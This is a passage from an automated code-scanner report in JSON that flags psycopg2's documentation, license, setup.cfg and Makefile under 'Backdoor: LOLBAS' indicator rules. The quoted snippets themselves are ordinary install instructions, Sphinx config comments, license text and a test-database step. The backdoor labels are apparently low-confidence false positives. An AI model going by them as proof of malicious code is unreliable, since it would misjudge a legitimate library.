          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 16,
                  "endLine": 241,
                  "endColumn": 20,
                  "snippet": {
                    "text": "- creating a :ref:`debug build <debug-build>`,\n- using :program:`pg_config` not in the :envvar:`PATH`,\n\nthen take a look at the ``setup.cfg`` file.\n\nSome of the options available in ``setup.cfg`` are also available as command\nline arguments of the ``build_ext`` sub-command. For instance you can specify\n",
                    "rendered": {
                      "text": "- creating a :ref:`debug build <debug-build>`,\n- using :program:`pg_config` not in the :envvar:`PATH`,\n\nthen take a look at the ``setup.cfg`` file.\n\nSome of the options available in ``setup.cfg`` are also available as command\nline arguments of the ``build_ext`` sub-command. For instance you can specify\n",
                      "markdown": "`- creating a :ref:`debug build <debug-build>`,\n- using :program:`pg_config` not in the :envvar:`PATH`,\n\nthen take a look at the ``setup.cfg`` file.\n\nSome of the options available in ``setup.cfg`` are also available as command\nline arguments of the ``build_ext`` sub-command. For instance you can specify\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 33,
                  "endLine": 215,
                  "endColumn": 37,
                  "snippet": {
                    "text": ".. note::\n\n    The libpq header files used to compile `!psycopg2` should match the\n    version of the library linked at runtime. If you get errors about missing\n    or mismatching libraries when importing `!psycopg2` check (e.g. using\n    :program:`ldd`) if the module ``psycopg2/_psycopg.so`` is linked to the\n    right ``libpq.so``.\n",
                    "rendered": {
                      "text": ".. note::\n\n    The libpq header files used to compile `!psycopg2` should match the\n    version of the library linked at runtime. If you get errors about missing\n    or mismatching libraries when importing `!psycopg2` check (e.g. using\n    :program:`ldd`) if the module ``psycopg2/_psycopg.so`` is linked to the\n    right ``libpq.so``.\n",
                      "markdown": "`.. note::\n\n    The libpq header files used to compile `!psycopg2` should match the\n    version of the library linked at runtime. If you get errors about missing\n    or mismatching libraries when importing `!psycopg2` check (e.g. using\n    :program:`ldd`) if the module ``psycopg2/_psycopg.so`` is linked to the\n    right ``libpq.so``.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 61,
                  "endLine": 204,
                  "endColumn": 65,
                  "snippet": {
                    "text": "^^^^^^^^^^^^^^^^^^^^\n\nUnless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\n",
                    "rendered": {
                      "text": "^^^^^^^^^^^^^^^^^^^^\n\nUnless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\n",
                      "markdown": "`^^^^^^^^^^^^^^^^^^^^\n\nUnless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 28,
                  "endLine": 360,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  please raise a ticket in the `bug tracker`_.\n\n- Complain on your blog or on Twitter that `!psycopg2` is the worst package\n  ever and about the quality time you have wasted figuring out the correct\n  :envvar:`ARCHFLAGS`. Especially useful from the Starbucks near you.\n\n.. _mailing list: https://www.postgresql.org/list/psycopg/\n",
                    "rendered": {
                      "text": "  please raise a ticket in the `bug tracker`_.\n\n- Complain on your blog or on Twitter that `!psycopg2` is the worst package\n  ever and about the quality time you have wasted figuring out the correct\n  :envvar:`ARCHFLAGS`. Especially useful from the Starbucks near you.\n\n.. _mailing list: https://www.postgresql.org/list/psycopg/\n",
                      "markdown": "`  please raise a ticket in the `bug tracker`_.\n\n- Complain on your blog or on Twitter that `!psycopg2` is the worst package\n  ever and about the quality time you have wasted figuring out the correct\n  :envvar:`ARCHFLAGS`. Especially useful from the Starbucks near you.\n\n.. _mailing list: https://www.postgresql.org/list/psycopg/\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 58,
                  "endLine": 208,
                  "endColumn": 64,
                  "snippet": {
                    "text": "(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n:envvar:`LD_LIBRARY_PATH` on Linux).\n\n",
                    "rendered": {
                      "text": "(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n:envvar:`LD_LIBRARY_PATH` on Linux).\n\n",
                      "markdown": "`(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n:envvar:`LD_LIBRARY_PATH` on Linux).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 206,
                  "startColumn": 24,
                  "endLine": 206,
                  "endColumn": 30,
                  "snippet": {
                    "text": "Unless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n",
                    "rendered": {
                      "text": "Unless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n",
                      "markdown": "`Unless you compile `!psycopg2` as a static library, or you install it from a\nself-contained wheel package, it will need the libpq_ library at runtime\n(usually distributed in a ``libpq.so`` or ``libpq.dll`` file).  `!psycopg2`\nrelies on the host OS to find the library if the library is installed in a\nstandard location there is usually no problem; if the library is in a\nnon-standard location you will have to tell Psycopg how to find it,\nwhich is OS-dependent (for instance setting a suitable\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 5,
                  "endLine": 190,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n.. code-block:: console\n\n    $ pip install psycopg2\n\nor, from the directory containing the source code:\n\n",
                    "rendered": {
                      "text": "\n.. code-block:: console\n\n    $ pip install psycopg2\n\nor, from the directory containing the source code:\n\n",
                      "markdown": "`\n.. code-block:: console\n\n    $ pip install psycopg2\n\nor, from the directory containing the source code:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 5,
                  "endLine": 107,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n.. code-block:: console\n\n    $ pip install --no-binary :all: psycopg2\n\n.. |--no-binary option| replace:: ``--no-binary`` option\n.. __: https://pip.pypa.io/en/stable/reference/pip_install/#install-no-binary\n",
                    "rendered": {
                      "text": "\n.. code-block:: console\n\n    $ pip install --no-binary :all: psycopg2\n\n.. |--no-binary option| replace:: ``--no-binary`` option\n.. __: https://pip.pypa.io/en/stable/reference/pip_install/#install-no-binary\n",
                      "markdown": "`\n.. code-block:: console\n\n    $ pip install --no-binary :all: psycopg2\n\n.. |--no-binary option| replace:: ``--no-binary`` option\n.. __: https://pip.pypa.io/en/stable/reference/pip_install/#install-no-binary\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/install.rst"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 5,
                  "endLine": 30,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n.. code-block:: console\n\n    $ pip install psycopg2-binary\n\nThis will install a pre-compiled binary version of the module which does not\nrequire the build or runtime prerequisites described below. Make sure to use\n",
                    "rendered": {
                      "text": "\n.. code-block:: console\n\n    $ pip install psycopg2-binary\n\nThis will install a pre-compiled binary version of the module which does not\nrequire the build or runtime prerequisites described below. Make sure to use\n",
                      "markdown": "`\n.. code-block:: console\n\n    $ pip install psycopg2-binary\n\nThis will install a pre-compiled binary version of the module which does not\nrequire the build or runtime prerequisites described below. Make sure to use\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 65,
                  "endLine": 241,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n",
                    "rendered": {
                      "text": "    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n",
                      "markdown": "`    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 55,
                  "endLine": 179,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n# html_last_updated_fmt = '%b %d, %Y'\n\n",
                    "rendered": {
                      "text": "# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n# html_last_updated_fmt = '%b %d, %Y'\n\n",
                      "markdown": "`# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n# html_last_updated_fmt = '%b %d, %Y'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 65,
                  "endLine": 165,
                  "endColumn": 69,
                  "snippet": {
                    "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n",
                    "rendered": {
                      "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n",
                      "markdown": "`# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 74,
                  "startColumn": 38,
                  "endLine": 75,
                  "snippet": {
                    "text": "\nintersphinx_mapping = {'py': ('https://docs.python.org/3', None)}\n\n# Pattern to generate links to the bug tracker\nticket_url = 'https://github.com/psycopg/psycopg2/issues/%s'\nticket_remap_until = 25\nticket_remap_offset = 230\n\n",
                    "rendered": {
                      "text": "\nintersphinx_mapping = {'py': ('https://docs.python.org/3', None)}\n\n# Pattern to generate links to the bug tracker\nticket_url = 'https://github.com/psycopg/psycopg2/issues/%s'\nticket_remap_until = 25\nticket_remap_offset = 230\n\n",
                      "markdown": "`\nintersphinx_mapping = {'py': ('https://docs.python.org/3', None)}\n\n# Pattern to generate links to the bug tracker\nticket_url = 'https://github.com/psycopg/psycopg2/issues/%s'\nticket_remap_until = 25\nticket_remap_offset = 230\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 241,
                  "startColumn": 72,
                  "endLine": 241,
                  "endColumn": 77,
                  "snippet": {
                    "text": "    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n",
                    "rendered": {
                      "text": "    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n",
                      "markdown": "`    )\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n# latex_logo = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 188,
                  "startColumn": 70,
                  "endLine": 189,
                  "snippet": {
                    "text": "# html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n# no need for the prev/next topic link using better theme: they are on top\nhtml_sidebars = {\n    '**': ['localtoc.html', 'searchbox.html'],\n}\n\n",
                    "rendered": {
                      "text": "# html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n# no need for the prev/next topic link using better theme: they are on top\nhtml_sidebars = {\n    '**': ['localtoc.html', 'searchbox.html'],\n}\n\n",
                      "markdown": "`# html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n# no need for the prev/next topic link using better theme: they are on top\nhtml_sidebars = {\n    '**': ['localtoc.html', 'searchbox.html'],\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/conf.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 72,
                  "endLine": 166,
                  "snippet": {
                    "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n",
                    "rendered": {
                      "text": "# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n",
                      "markdown": "`# A shorter title for the navigation bar.  Default is the same as html_title.\nhtml_short_title = 'Home'\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\n# html_logo = None\n\n# The name of an image file (within the static path) to use as favicon of the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/COPYING.LESSER"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 58,
                  "endLine": 110,
                  "endColumn": 62,
                  "snippet": {
                    "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n",
                    "rendered": {
                      "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n",
                      "markdown": "`       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/COPYING.LESSER"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 45,
                  "endLine": 147,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n",
                    "rendered": {
                      "text": "  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n",
                      "markdown": "`  6. Revised Versions of the GNU Lesser General Public License.\n\n  The Free Software Foundation may publish revised and/or new versions\nof the GNU Lesser General Public License from time to time. Such new\nversions will be similar in spirit to the present version, but may\ndiffer in detail to address new problems or concerns.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/COPYING.LESSER"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 58,
                  "endLine": 141,
                  "endColumn": 64,
                  "snippet": {
                    "text": "   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n",
                    "rendered": {
                      "text": "   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n",
                      "markdown": "`   conveyed under the terms of this License.\n\n   b) Give prominent notice with the combined library that part of it\n   is a work based on the Library, and explaining where to find the\n   accompanying uncombined form of the same work.\n\n  6. Revised Versions of the GNU Lesser General Public License.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/COPYING.LESSER"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 65,
                  "endLine": 111,
                  "snippet": {
                    "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n",
                    "rendered": {
                      "text": "       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n",
                      "markdown": "`       Corresponding Source.\n\n       1) Use a suitable shared library mechanism for linking with the\n       Library.  A suitable mechanism is one that (a) uses at run time\n       a copy of the Library already present on the user's computer\n       system, and (b) will operate properly with a modified version\n       of the Library that is interface-compatible with the Linked\n       Version.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/release.rst"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 5,
                  "endLine": 28,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  E.g.::\n\n    # Tag name will be 2_8_4\n    $ git tag -a -s ${VERSION//\\./_}\n\n    Psycopg 2.8.4 released\n\n",
                    "rendered": {
                      "text": "  E.g.::\n\n    # Tag name will be 2_8_4\n    $ git tag -a -s ${VERSION//\\./_}\n\n    Psycopg 2.8.4 released\n\n",
                      "markdown": "`  E.g.::\n\n    # Tag name will be 2_8_4\n    $ git tag -a -s ${VERSION//\\./_}\n\n    Psycopg 2.8.4 released\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.cfg"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 21,
                  "endLine": 12,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n# For Windows only:\n# Set to 1 if the PostgreSQL library was built with OpenSSL.\n# Required to link in OpenSSL libraries and dependencies.\nhave_ssl=0\n\n# Set to 1 to statically link against the postgresql client library.\n",
                    "rendered": {
                      "text": "\n# For Windows only:\n# Set to 1 if the PostgreSQL library was built with OpenSSL.\n# Required to link in OpenSSL libraries and dependencies.\nhave_ssl=0\n\n# Set to 1 to statically link against the postgresql client library.\n",
                      "markdown": "`\n# For Windows only:\n# Set to 1 if the PostgreSQL library was built with OpenSSL.\n# Required to link in OpenSSL libraries and dependencies.\nhave_ssl=0\n\n# Set to 1 to statically link against the postgresql client library.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 14,
                  "endLine": 70,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\ntestdb:\n\t@echo \"* Creating $(TESTDB)\"\n\t@if psql -l | grep -q \" $(TESTDB) \"; then \\\n\t    dropdb $(TESTDB) >/dev/null; \\\n\tfi\n\tcreatedb $(TESTDB)\n",
                    "rendered": {
                      "text": "\ntestdb:\n\t@echo \"* Creating $(TESTDB)\"\n\t@if psql -l | grep -q \" $(TESTDB) \"; then \\\n\t    dropdb $(TESTDB) >/dev/null; \\\n\tfi\n\tcreatedb $(TESTDB)\n",
                      "markdown": "`\ntestdb:\n\t@echo \"* Creating $(TESTDB)\"\n\t@if psql -l | grep -q \" $(TESTDB) \"; then \\\n\t    dropdb $(TESTDB) >/dev/null; \\\n\tfi\n\tcreatedb $(TESTDB)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
